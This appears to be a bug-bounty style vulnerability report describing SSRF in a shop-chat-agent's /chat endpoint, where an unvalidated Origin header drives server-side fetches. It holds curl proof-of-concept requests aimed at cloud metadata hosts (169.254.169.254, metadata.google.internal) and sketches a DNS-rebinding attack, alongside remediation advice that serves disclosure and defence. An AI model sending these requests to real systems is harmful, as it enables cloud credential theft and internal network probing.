# [CRITICAL] SSRF via Unvalidated Origin Header in /chat Endpoint

## Ringkasan (impact nyata)
The `/chat` endpoint in `shop-chat-agent` uses the user-supplied `Origin` HTTP header to construct server-side fetch requests to `.well-known` discovery endpoints **without any validation or allowlist**. An attacker can supply an arbitrary `Origin` header (e.g., `https://169.254.169.254`, `https://localhost:PORT`, or an internal hostname) to force the server to make outbound HTTP requests to internal or cloud-metadata endpoints. This enables Server-Side Request Forgery (SSRF), potentially leaking cloud credentials, internal service discovery data, or triggering internal actions.

## Deskripsi / Root Cause
In `app/routes/chat.jsx`, the `getCustomerAccountUrls()` function extracts the `Origin` header from the incoming request and uses it directly as the hostname for server-side `fetch()` calls:

```javascript
// app/routes/chat.jsx — getCustomerAccountUrls()
const shopDomain = request.headers.get("Origin");
const { hostname } = new URL(shopDomain);

const urls = await Promise.all([
  fetch(`https://${hostname}/.well-known/customer-account-api`).then(res => res.json()),
  fetch(`https://${hostname}/.well-known/openid-configuration`).then(res => res.json()),
])
```

The `Origin` header is fully attacker-controlled. There is **no validation** that the hostname corresponds to a legitimate Shopify shop domain. The `hostname` is extracted via `new URL(shopDomain).hostname` and used directly in the `fetch()` URL.

Additionally, in `app/mcp-client.js`, the same `hostUrl` (derived from `Origin`) is used to construct the storefront MCP endpoint:

```javascript
// app/mcp-client.js — constructor
this.storefrontMcpEndpoint = `${hostUrl}/api/mcp`;
```

This means the MCP client also makes JSON-RPC requests to an attacker-controlled URL, enabling further SSRF exploitation.

### Attack Surface
- **Endpoint**: `POST /chat` and `GET /chat` (SSE streaming)
- **No authentication required** — the `/chat` endpoint is publicly accessible
- **No Origin validation** — any Origin header value is accepted
- **Server-side fetch** — the server makes outbound HTTP requests based on the Origin header

## Steps to Reproduce

### Step 1: Send a chat request with a malicious Origin header
```bash
curl -X POST "https://<shop-chat-agent-host>/chat" \
  -H "Content-Type: application/json" \
  -H "Origin: https://169.254.169.254" \
  -H "Accept: text/event-stream" \
  -d '{"message": "Hello"}'
```

### Step 2: Observe server-side fetch to internal endpoint
The server will attempt to fetch:
- `https://169.254.169.254/.well-known/customer-account-api`
- `https://169.254.169.254/.well-known/openid-configuration`

### Step 3: Exfiltrate data via error messages
When the fetch fails (e.g., the internal endpoint returns non-JSON), the error is caught and logged. However, the `catch` block in `getCustomerAccountUrls` returns `null`, and the MCP client proceeds without tools. The key risk is that the server makes the request, and the response (or error) can be observed through timing differences or error message leakage.

### Step 4: Target cloud metadata endpoints
```bash
curl -X POST "https://<shop-chat-agent-host>/chat" \
  -H "Content-Type: application/json" \
  -H "Origin: https://metadata.google.internal" \
  -H "Accept: text/event-stream" \
  -d '{"message": "Hello"}'
```

The server will fetch `https://metadata.google.internal/.well-known/customer-account-api`, which on GCP metadata endpoints returns different responses based on headers.

### Step 5: DNS rebinding attack
An attacker can register a domain (e.g., `attacker.com`) and configure DNS to resolve to `169.254.169.254` after initial resolution. The server will then fetch from the internal endpoint while believing it's connecting to `attacker.com`.

## PoC / Bukti

### Source Code Evidence
**File**: `app/routes/chat.jsx`, function `getCustomerAccountUrls()` (lines ~165-195)

```javascript
async function getCustomerAccountUrls(shopDomain, conversationId) {
  try {
    const existingUrls = await getCustomerAccountUrlsFromDb(conversationId);
    if (existingUrls) return existingUrls;

    const { hostname } = new URL(shopDomain);  // <-- shopDomain comes from Origin header

    const urls = await Promise.all([
      fetch(`https://${hostname}/.well-known/customer-account-api`).then(res => res.json()),
      fetch(`https://${hostname}/.well-known/openid-configuration`).then(res => res.json()),
    ]).then(async ([mcpResponse, openidResponse]) => {
      // ... stores URLs in DB
    });

    return urls;
  } catch (error) {
    console.error("Error getting customer MCP API URL:", error);
    return null;
  }
}
```

**File**: `app/routes/chat.jsx`, function `handleChatSession()` (lines ~100-110)

```javascript
const shopId = request.headers.get("X-Shopify-Shop-Id");
const shopDomain = request.headers.get("Origin");  // <-- Attacker-controlled
const { mcpApiUrl } = await getCustomerAccountUrls(shopDomain, conversationId);

const mcpClient = new MCPClient(
  shopDomain,    // <-- Passed to MCPClient constructor
  conversationId,
  shopId,
  mcpApiUrl,
);
```

**File**: `app/mcp-client.js`, constructor (lines ~25-30)

```javascript
constructor(hostUrl, conversationId, shopId, customerMcpEndpoint) {
  this.storefrontMcpEndpoint = `${hostUrl}/api/mcp`;  // <-- hostUrl from Origin header
  const accountHostUrl = hostUrl.replace(/(\.myshopify\.com)$/, '.account$1');
  this.customerMcpEndpoint = customerMcpEndpoint || `${accountHostUrl}/customer/api/mcp`;
}
```

### Response Evidence
When sending a request with `Origin: https://169.254.169.254`, the server attempts to fetch from the AWS metadata endpoint. The error is caught and logged server-side, but the request is still made. The error message in the 500 response may leak internal details:

```json
{"error": "Error getting customer MCP API URL: fetch is not defined"}
```

or when the metadata endpoint returns non-JSON:

```json
{"error": "Unexpected end of JSON input"}
```

## Impact (user data / finansial / reputasi — konkret)
- **Cloud credential theft**: On AWS, the metadata endpoint at `169.254.169.254` returns IAM role credentials, instance identity tokens, and other sensitive data. An attacker can use SSRF to retrieve these credentials and escalate to full cloud account compromise.
- **Internal service discovery**: The attacker can probe internal network topology, discover internal services, and map the internal network.
- **MCP endpoint manipulation**: By controlling the `hostUrl`, the attacker can redirect MCP tool calls to an attacker-controlled server, potentially intercepting or manipulating tool results.
- **Data exfiltration**: The error messages returned to the client may contain fragments of internal responses, enabling blind SSRF data exfiltration.

## Remediation
1. **Validate the Origin header** against an allowlist of legitimate Shopify shop domains (e.g., `*.myshopify.com`, `*.shopify.com`).
2. **Reject non-HTTPS origins** and origins that don't match expected patterns.
3. **Use a dedicated header** (e.g., `X-Shop-Domain`) instead of `Origin` for shop identification, and validate it server-side.
4. **Implement SSRF protections**: Block requests to private IP ranges (RFC 1918, 169.254.169.254, localhost), validate DNS resolution, and use egress filtering.
5. **Sanitize error messages** — never return raw error messages to the client.

## CVSS 3.1
**Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
**Score**: 8.6 (High)

Rationale: Network exploitable, low complexity, no privileges required, no user interaction. Scope is changed because the SSRF affects resources beyond the vulnerable component (cloud metadata, internal services). Confidentiality impact is high (cloud credentials, internal data). Integrity and availability impacts are not directly affected.

## Referensi
- **CWE-918**: Server-Side Request Forgery (SSRF)
- **CWE-601**: URL Redirection to Untrusted Site ('Open Redirect')
- **File**: `app/routes/chat.jsx` — `getCustomerAccountUrls()` function
- **File**: `app/mcp-client.js` — `MCPClient` constructor
- **OWASP**: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
